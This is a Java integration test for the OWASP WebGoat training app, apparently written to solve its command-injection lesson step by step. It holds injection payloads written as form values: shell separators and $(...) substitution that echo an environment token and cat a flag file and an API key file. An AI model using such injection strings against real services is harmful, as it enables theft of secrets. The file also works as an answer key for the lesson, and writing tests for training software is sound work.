/*
 * SPDX-FileCopyrightText: Copyright © 2025 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration;

import static io.restassured.RestAssured.given;
import static org.hamcrest.CoreMatchers.is;
import static org.hamcrest.MatcherAssert.assertThat;

import io.restassured.path.json.JsonPath;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.junit.jupiter.api.Test;

public class CommandInjectionLessonIntegrationTest extends IntegrationTest {

  private static final Pattern API_KEY_PATTERN = Pattern.compile("API_KEY=[^\\s]+");

  @Test
  void solveCommandInjectionLesson() {
    startLesson("CommandInjection", true);

    acknowledgeSafetyGate();

    solveTask1();
    String leakedToken = leakTask2Token();
    submitTask2Token(leakedToken);
    String flag = captureTask3Flag();
    submitTask3Flag(flag);
    String apiKey = captureTask4ApiKey();
    submitTask4Key(apiKey);
    configureTask5Remediation();

    checkResults("CommandInjection");
  }

  private void acknowledgeSafetyGate() {
    assertThat(
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("ack", "I understand commands will execute")
            .post(webGoatUrlConfig.url("CommandInjection/safety"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        is(true));
  }

  private void solveTask1() {
    boolean isWindows = isWindowsHost();
    String expectedCommand =
        (isWindows ? "cmd.exe /c ping -n 1 " : "/bin/sh -c ping -c 1 ") + "localhost";

    assertThat(
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("host", "localhost")
            .formParam("custom", "")
            .formParam("observed", expectedCommand)
            .post(webGoatUrlConfig.url("CommandInjection/task1/run"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        is(true));
  }

  private String leakTask2Token() {
    String output =
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("base", "")
            .formParam("payload", payloadForCurrentOs())
            .post(webGoatUrlConfig.url("CommandInjection/task2/run"))
            .then()
            .statusCode(200)
            .extract()
            .path("output");

    java.util.regex.Matcher matcher =
        java.util.regex.Pattern.compile("[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")
            .matcher(output);
    if (!matcher.find()) {
      throw new IllegalStateException("Token not present in Task 2 output");
    }
    return matcher.group();
  }

  private void submitTask2Token(String token) {
    assertThat(
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("base", "")
            .formParam("payload", payloadForCurrentOs())
            .formParam("token", token)
            .post(webGoatUrlConfig.url("CommandInjection/task2/run"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        is(true));
  }

  private String captureTask3Flag() {
    JsonPath response =
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("title", "luna images/*; cat flag.txt; #")
            .post(webGoatUrlConfig.url("CommandInjection/task3/search"))
            .then()
            .statusCode(200)
            .extract()
            .jsonPath();

    String console = response.getString("console");
    int start = console.indexOf("flag{");
    if (start < 0) {
      throw new IllegalStateException("Flag not present in Task 3 output");
    }
    int end = console.indexOf("}", start);
    if (end < 0) {
      throw new IllegalStateException("Flag not present in Task 3 output");
    }
    return console.substring(start, end + 1);
  }

  private void submitTask3Flag(String flag) {
    assertThat(
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("flag", flag)
            .post(webGoatUrlConfig.url("CommandInjection/task3/flag"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        is(true));
  }

  private String captureTask4ApiKey() {
    JsonPath response =
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("title", "$(cat api-key.txt >&2)")
            .post(webGoatUrlConfig.url("CommandInjection/task4/search"))
            .then()
            .statusCode(200)
            .extract()
            .jsonPath();

    String console = response.getString("console");
    Matcher matcher = API_KEY_PATTERN.matcher(console);
    if (!matcher.find()) {
      throw new IllegalStateException("API key not present in Task 4 output");
    }
    return matcher.group();
  }

  private void submitTask4Key(String apiKey) {
    assertThat(
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("apikey", apiKey)
            .post(webGoatUrlConfig.url("CommandInjection/task4/key"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        is(true));
  }

  private void configureTask5Remediation() {
    assertThat(
        given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("mode", "ALLOWLIST_ONLY")
            .formParam("allowlist", "true")
            .formParam("sanitiser", "true")
            .post(webGoatUrlConfig.url("CommandInjection/task5/evaluate"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        is(true));
  }
  private boolean isWindowsHost() {
    return System.getProperty("os.name", "").toLowerCase().contains("win");
  }

  private String payloadForCurrentOs() {
    return isWindowsHost() ? "&& echo %WEBGOAT_BUILD_TOKEN%" : "; echo $WEBGOAT_BUILD_TOKEN";
  }
}
